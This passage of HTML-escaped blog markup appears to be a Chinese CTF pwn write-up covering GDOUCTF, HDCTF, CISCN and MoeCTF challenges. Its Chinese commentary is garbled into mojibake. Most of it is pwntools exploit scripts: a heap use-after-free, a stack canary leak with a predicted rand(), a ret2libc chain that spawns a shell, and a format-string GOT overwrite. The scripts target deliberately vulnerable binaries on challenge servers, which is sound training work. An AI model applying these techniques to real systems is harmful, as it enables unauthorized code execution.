class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# Â  Â sh.recvuntil(&amp;quot;choice :&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def show(idx):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â  Â  sh.recvuntil(&amp;#x27;choice :&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â  Â  sh.sendline(&amp;#x27;3&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â  Â  sh.sendlineafter(&amp;#x27;Index :&amp;#x27;,str(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.recvuntil(&amp;quot;oice :&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(0x10,&amp;#x27;aaaaa&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(0x20,&amp;#x27;bbbbb&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(0)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload =p64(0x400B9C)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(0x10,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(0)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;gdouctf-2023å¥‡æ€ªçš„elf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#gdouctf-2023å¥‡æ€ªçš„elf&#34;&gt;#&lt;/a&gt; [GDOUCTF 2023] å¥‡æ€ªçš„ ELF&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;ä¸€ä¸ªç¦»è°±çš„æ¶æ„é¢˜ç›®ï¼Œä¸¤ä¸ªæ–‡ä»¶ä¸€ä¸ªæ˜¯ x86_64 (arm64) ä¸€ä¸ªæ˜¯ arm64 æ‰€ä»¥ç¬¬äºŒä¸ªå› ä¸ºç¯å¢ƒåŸå› æ— æ³•è¿è¡Œï¼ŒæŠŠ linux2 é‡Œé¢çš„ flag è½¬æ¢ä¸º 16 è¿›åˆ¶ç„¶ååœ¨ python è¿›è¡Œä¸€æ¬¡å¼‚æˆ–è¿ç®—å³å¯å¾—åˆ° flag2&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;flag=[&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â  0xF2, 0xEE, 0xE3, 0xD9, 0xCA, 0xEF, 0xE8, 0xF3, 0xFE, 0xD9,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â  0xF1, 0xE9, 0xF4, 0xEA, 0xE2, 0xA7, 0xFB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for i in flag:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â  Â  print(chr(i^0x86),end=&amp;#x27;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hdctf-2023makewish&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hdctf-2023makewish&#34;&gt;#&lt;/a&gt; [HDCTF 2023]Makewish&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;è¿™ä¸ªé¢˜ç›®å¾ˆæœ‰æ„æ€éœ€è¦è‡ªå·±å¤šæ¬¡è°ƒè¯•æ‰èƒ½çŸ¥é“å…·ä½“çš„è§£å†³åŠæ³•ç»¼åˆäº†å‰é¢çš„å¾ˆå¤šçŸ¥è¯†ç‚¹&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import ctypes #è¿™é‡Œè°ƒç”¨äº†ä¸€ä¸ªä¼ªéšæœºæ•°&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level=&amp;#x27;debug&amp;#x27; #æ—¥å¿—&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc=ctypes.CDLL(&amp;#x27;/lib/x86_64-linux-gnu/libc.so.6&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.srand(1) #srand&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;while 1:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p=process(&amp;#x27;./pwn&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	#p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28492)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload=b&amp;#x27;a&amp;#x27;*(0x30-0x8)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	canary=u64(p.recv(8))-0x0a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	log.info(hex(canary))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	rand=libc.rand()%1000+324&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendafter(&amp;#x27;key\n&amp;#x27;,p32(rand))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload=p64(0x4007C7)+p64(canary)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendlineafter(&amp;#x27;me&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;åˆ©ç”¨ puts å¾—åˆ° canaryã€‚&lt;/p&gt;
&lt;h5 id=&#34;ciscn-2019åä¸­pwn1&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ciscn-2019åä¸­pwn1&#34;&gt;#&lt;/a&gt; [CISCN 2019 åä¸­] PWN1&lt;/h5&gt;
&lt;p&gt;å¸¸è§„ ret2libc ç›´æ¥æ‰“&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from LibcSearcher import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(arch=&amp;#x27;amd64&amp;#x27;, os=&amp;#x27;linux&amp;#x27;, log_level=&amp;#x27;debug&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#io = process(&amp;#x27;./CISCN_PWN1&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#io = process(&amp;#x27;./pwn&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28793)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&amp;#x27;./pwn&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Padding = b&amp;#x27;\x00&amp;#x27; + b&amp;#x27;A&amp;#x27; * (0x50 + 0x08 - 0x01)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_plt = elf.plt[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_got = elf.got[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main = elf.sym[&amp;#x27;main&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdi = 0x400C83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret = 0x4006B9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(b&amp;#x27;choice!\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(b&amp;#x27;1&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(b&amp;#x27;encrypted\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Payload = Padding + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(Payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(b&amp;#x27;Ciphertext\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(b&amp;#x27;\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addr = u64(io.recvuntil(b&amp;#x27;\x7f&amp;#x27;)[:6].ljust(8, b&amp;#x27;\x00&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(hex(addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = LibcSearcher(&amp;#x27;puts&amp;#x27;, addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_addr = addr-libc.dump(&amp;#x27;puts&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system_addr = libc_addr+libc.dump(&amp;#x27;system&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh_addr = libc_addr+libc.dump(&amp;#x27;str_bin_sh&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(b&amp;#x27;choice!\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(b&amp;#x27;1&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(b&amp;#x27;encrypted\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Payload_2 = Padding + p64(ret) + p64(rdi) + p64(sh_addr) + p64(system_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(Payload_2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;moectf-2022babyfmt&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#moectf-2022babyfmt&#34;&gt;#&lt;/a&gt; [MoeCTF 2022]babyfmt&lt;/h5&gt;
&lt;p&gt;æŸ¥çœ‹åˆ°è¿™ä¸ªé¢˜å¾ˆç®€å•çš„å¤„ç†æ–¹æ³•ï¼Œé‡Œé¢æœ‰ä¸ª printf (buf) å¯ä»¥ç›´æ¥åˆ¤æ–­ä¸ºå­—ç¬¦ä¸²æº¢å‡ºï¼Œæ²¡å¼€ FULLï¼ŒåŸºæœ¬æ€è·¯å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²åŠ«æŒ got è¡¨ï¼Œæ‰¾åˆ°åç§»ä¹‹åè¯•äº†å‡ ç§ä¿®æ”¹ï¼Œæ”¹å‘å¯ä»¥è¯´æ˜¯å¤šç§å¤šæ ·äº†ã€‚æ¥æ”¶ backdoor æ²¡å•¥ç”¨ï¼Œå¯ä»¥æ”¹ got è¡¨ç›´æ¥ç”¨ system çš„ got è¡¨å°±è¡Œï¼Œå¦‚æœå¼€ FULL RELRO çš„è¯å¯ä»¥è¦†ç›– ret åœ°å€ï¼Œç»™çš„åœ°å€è¿˜æœ‰ç‚¹ç”¨&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;./pwn&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#p=process(&amp;#x27;./pwn&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28523)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print_got=elf.got[&amp;#x27;printf&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&amp;quot;\n&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(&amp;quot;%10$s&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;baskdoor=int(p.recv(9),16)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=fmtstr_payload(11,&amp;#123;print_got:baskdoor&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;ciscn_2019_ne_5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ciscn_2019_ne_5&#34;&gt;#&lt;/a&gt; ciscn_2019_ne_5&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;æ³¨æ„ scanf é‡Œé¢ä¹Ÿç»™äº† sh å’Œ system ç›´æ¥æ‰“&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span 